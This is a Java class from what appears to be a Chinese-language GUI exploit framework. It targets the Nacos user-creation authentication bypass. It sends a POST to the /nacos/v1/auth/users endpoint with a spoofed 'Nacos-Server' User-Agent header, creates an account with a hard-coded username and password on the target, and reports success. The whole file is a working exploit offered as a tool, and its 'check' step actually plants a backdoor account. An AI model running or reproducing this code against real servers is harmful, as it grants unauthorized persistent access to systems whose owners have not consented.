package exp.cms;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class nacos_Creatuser implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞无法getshell");
        });
        return false;
    }

    private boolean att(String url , TextArea textArea){
        HashMap<String,String> head = new HashMap<String,String>();
        head.put("User-Agent","Nacos-Server");
        String poststring = "";
        Response post = HttpTools.post(url + "/nacos/v1/auth/users?username=nishizhu&password=zhu@123", poststring, head, "utf-8");

        if(post.getCode() == 200 && post.getText().contains("create user ok")){
            Platform.runLater(() -> {
                textArea.appendText("\n nacos任意用户添加漏洞存在  用户添加成功，账号：nishizhu 密码：zhu@123");
            });
            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n nacos任意用户添加-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }




}
